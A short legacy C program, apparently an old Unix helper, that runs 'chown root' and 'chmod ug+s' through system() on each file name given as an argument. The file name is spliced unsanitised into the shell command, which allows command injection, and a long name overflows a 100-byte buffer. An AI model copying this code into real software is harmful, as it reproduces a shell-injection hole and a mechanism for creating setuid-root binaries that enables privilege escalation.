
main(argc,argv)
int argc; char **argv;
   {
	register char *cptr;
        char buf[100];

	do	/* loop over arg list */
	   {
		argc--; argv++;
		cptr= *argv;
		if(argc && (*cptr == '-'))
		   {
			cptr++;
			switch(*cptr)
			  {
			  case 'i':
				signal (2,1);
				break;
			  case 'm':
				cptr = *(++argv); argc--;
				break;
			  default:
				break;
			  }
			continue;
		   }
		if(argc) {
		    sprintf (buf,"chown root %s; chmod ug+s %s",cptr,cptr);
		    system (buf);
		}
	   } while(argc);
	exit();
   }



